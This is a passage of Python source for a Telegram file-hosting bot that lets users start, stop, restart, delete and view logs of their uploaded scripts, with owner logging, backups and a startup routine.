            file_url = f"{replit_url}/file/{file_hash}"

            markup.add(
                types.InlineKeyboardButton("🔗 View File", url=file_url)
            )

        markup.add(
            types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}'),
            types.InlineKeyboardButton("🔙 Back", callback_data=f'back_files_{user_id}')
        )

        status = "🟢 Running" if is_running else "⭕ Stopped" if file_type == 'executable' else "📁 Hosted"

        control_text = f"🔧 File Control Panel\n\n"
        control_text += f"📄 File: {file_name}\n"
        control_text += f"📁 Type: {file_type}\n"
        control_text += f"🔄 Status: {status}\n"

        if file_type == 'executable' and is_running:
            uptime = get_script_uptime(user_id, file_name)
            if uptime:
                control_text += f"⏱️ Uptime: {uptime}\n"

        control_text += f"👤 Owner: {user_id}\n\n"
        control_text += f"🎛️ Choose an action:"

        bot.edit_message_text(
            control_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )

        bot.answer_callback_query(call.id, f"Control panel for {file_name}")

    except Exception as e:
        logger.error(f"Error in file control handler: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('start_'))
def handle_start_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)

        if not os.path.exists(file_path):
            bot.answer_callback_query(call.id, "❌ File not found!")
            return

        if is_bot_running(user_id, file_name):
            bot.answer_callback_query(call.id, "⚠️ Already running!")
            return

        start_time = time.time()
        success, result = execute_script(user_id, file_path, call.message)
        execution_time = round(time.time() - start_time, 2)

        if success:
            bot.answer_callback_query(call.id, f"🟢 Started in {execution_time}s!")
            call.data = f'control_{user_id}_{file_name}'
            handle_file_control(call)
            log_script_execution(user_id, file_name, "🟢 STARTED", execution_time)
        else:
            bot.answer_callback_query(call.id, f"❌ Start failed: {result}")
            log_script_execution(user_id, file_name, "❌ FAILED")

    except Exception as e:
        logger.error(f"Error starting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and script_info.get('process'):
            try:
                runtime = get_script_uptime(user_id, file_name) or "Unknown"

                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)

                remove_running_script(user_id, file_name)

                if script_key in bot_scripts:
                    del bot_scripts[script_key]

                bot.answer_callback_query(call.id, f"🔴 Stopped! Runtime: {runtime}")
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
                log_script_execution(user_id, file_name, "🔴 STOPPED")
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Stop failed: {str(e)}")
        else:
            bot.answer_callback_query(call.id, "⚠️ Not running!")

    except Exception as e:
        logger.error(f"Error stopping file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('restart_'))
def handle_restart_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and script_info.get('process'):
            try:
                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)
                remove_running_script(user_id, file_name)
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            except:
                pass

        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)

        if os.path.exists(file_path):
            start_time = time.time()
            success, result = execute_script(user_id, file_path, call.message)
            execution_time = round(time.time() - start_time, 2)

            if success:
                bot.answer_callback_query(call.id, f"🔄 Restarted in {execution_time}s!")
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
                log_script_execution(user_id, file_name, "🔄 RESTARTED", execution_time)
            else:
                bot.answer_callback_query(call.id, f"❌ Restart failed: {result}")
        else:
            bot.answer_callback_query(call.id, "❌ File not found!")

    except Exception as e:
        logger.error(f"Error restarting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('logs_'))
def handle_show_logs(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)

        if script_info and 'log_file_path' in script_info:
            log_file_path = script_info['log_file_path']

            if os.path.exists(log_file_path):
                try:
                    with open(log_file_path, 'r') as f:
                        logs = f.read()

                    if logs.strip():
                        if len(logs) > 4000:
                            logs = "..." + logs[-4000:]

                        logs_text = f"📜 Execution Logs - {file_name}\n\n```\n{logs}\n```"
                    else:
                        logs_text = f"📜 Execution Logs - {file_name}\n\n🔇 No output yet"

                    bot.send_message(call.message.chat.id, logs_text, parse_mode='Markdown')
                    bot.answer_callback_query(call.id, "📜 Logs sent!")

                except Exception as e:
                    bot.answer_callback_query(call.id, f"❌ Error reading logs: {str(e)}")
            else:
                bot.answer_callback_query(call.id, "❌ Log file not found!")
        else:
            bot.answer_callback_query(call.id, "❌ No logs available!")

    except Exception as e:
        logger.error(f"Error showing logs: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
def handle_delete_file(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]

        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return

        script_key = f"{user_id}_{file_name}"
        if script_key in bot_scripts:
            try:
                process = bot_scripts[script_key]['process']
                process.terminate()
                remove_running_script(user_id, file_name)
                del bot_scripts[script_key]
            except:
                pass

        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)

        if os.path.exists(file_path):
            os.remove(file_path)

        if user_id in user_files:
            user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]

        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error deleting file: {e}")

        # Update persistent data
        save_persistent_data()

        bot.answer_callback_query(call.id, f"🗑️ {file_name} deleted!")

        call.data = f'back_files_{user_id}'
        handle_back_to_files(call)

        send_to_log_channel(f"🗑️ FILE DELETED\n\nUser ID: {user_id}\nFile: {file_name}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    except Exception as e:
        logger.error(f"Error deleting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_files_'))
def handle_back_to_files(call):
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[2])

        files = user_files.get(user_id, [])

        if not files:
            files_text = "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!"
            markup = None
        else:
            files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
            markup = types.InlineKeyboardMarkup(row_width=1)

            for i, (file_name, file_type) in enumerate(files, 1):
                if file_type == 'executable':
                    is_running = is_bot_running(user_id, file_name)
                    status = "🟢 Running" if is_running else "⭕ Stopped"
                    icon = "🚀"

                    if is_running:
                        uptime = get_script_uptime(user_id, file_name)
                        if uptime:
                            status += f" (Uptime: {uptime})"

                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
                else:
                    status = "📁 Hosted"
                    icon = "📄"
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()

                    domain = os.environ.get('REPL_SLUG', 'universal-file-host')
                    owner = os.environ.get('REPL_OWNER', 'replit-user')

                    try:
                        replit_url = f"https://{domain}.{owner}.repl.co"
                        test_response = requests.get(f"{replit_url}/health", timeout=2)
                        if test_response.status_code != 200:
                            replit_url = f"https://{domain}-{owner}.replit.app"
                    except:
                        replit_url = f"https://{domain}-{owner}.replit.app"

                    file_url = f"{replit_url}/file/{file_hash}"
                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"

                markup.add(types.InlineKeyboardButton(
                    f"{icon} {file_name} - {status}", 
                    callback_data=f'control_{user_id}_{file_name}'
                ))

            files_text += "⚙️ Management Options:\n• 🟢 Start/🔴 Stop executable files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"

        bot.edit_message_text(
            files_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )

        bot.answer_callback_query(call.id, "📂 Files list updated!")

    except Exception as e:
        logger.error(f"Error going back to files: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Catch all handler for unsupported messages ---
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id]:
        handle_broadcast_message(message)
        return

    safe_reply_to(message, "🔒 Use the menu buttons or send /start for help.")

# --- Initialize and Start Bot ---
def cleanup_on_exit():
    """Cleanup function called on exit"""
    logger.info("Performing cleanup on exit...")

    create_backup()
    save_persistent_data()
    save_all_users_to_backup()

    for script_key, script_info in bot_scripts.items():
        try:
            process = script_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated script: {script_key}")
        except Exception as e:
            logger.error(f"Error terminating script {script_key}: {e}")

    for user_id, clone_info in user_clones.items():
        try:
            process = clone_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated clone for user: {user_id}")
        except Exception as e:
            logger.error(f"Error terminating clone for user {user_id}: {e}")

def send_startup_message():
    """Send startup message to log channel"""
    try:
        bot_info = bot.get_me()
        startup_msg = f"🚀 BOT STARTED SUCCESSFULLY\n\n"
        startup_msg += f"🤖 Bot: @{bot_info.username}\n"
        startup_msg += f"👑 Owner ID: {OWNER_ID}\n"
        startup_msg += f"📊 Active Users: {len(active_users)}\n"
        startup_msg += f"📁 Total Files: {sum(len(files) for files in user_files.values())}\n"
        startup_msg += f"🚀 Running Scripts: {len(bot_scripts)}\n"
        startup_msg += f"🤖 Running Clones: {len(user_clones)}\n"
        startup_msg += f"🔄 Auto-restart: Enabled\n"
        startup_msg += f"🛡️ Security: Maximum\n"
        startup_msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        startup_msg += f"✅ All systems operational!"

        send_to_log_channel(startup_msg)
    except Exception as e:
        logger.error(f"Error sending startup message: {e}")

if __name__ == "__main__":
    atexit.register(cleanup_on_exit)

    init_db()
    load_data()

    keep_alive()
    start_periodic_backup()
    start_self_ping()  # Self-messaging system start

    logger.info("🚀 Universal File Host Bot starting...")
    logger.info("🔄 Self-ping system: Active (every 2 minutes)")
    logger.info(f"👑 Owner ID: {OWNER_ID}")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info(f"📁 Upload directory: {UPLOAD_BOTS_DIR}")
    logger.info(f"📝 Log Channel: {LOG_CHANNEL}")

    try:
        bot_info = bot.get_me()
        logger.info(f"Bot connected successfully: @{bot_info.username}")
        print(f"🤖 Bot connected successfully: @{bot_info.username}")
        print(f"🚀 Bot is now running with ENHANCED PERSISTENT DATA!")
        print(f"📊 All user data and files are preserved on restart")
        print(f"🔄 Auto-restart feature: All scripts restart automatically")
        print(f"🤖 Auto-clone feature: All clone bots restart automatically")
        print(f"🔐 Advanced persistent data system")
        print(f"💾 Automatic hourly backups")
        print(f"📝 Comprehensive logging to private channel")
        print(f"👥 User preservation: {len(active_users)} users loaded")

        # Send startup message
        send_startup_message()

        # Create initial backup
        create_backup()
        save_persistent_data()

        bot.infinity_polling(timeout=10, long_polling_timeout=5, none_stop=True, interval=0)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"❌ Bot connection failed: {e}")
        sys.exit(1)
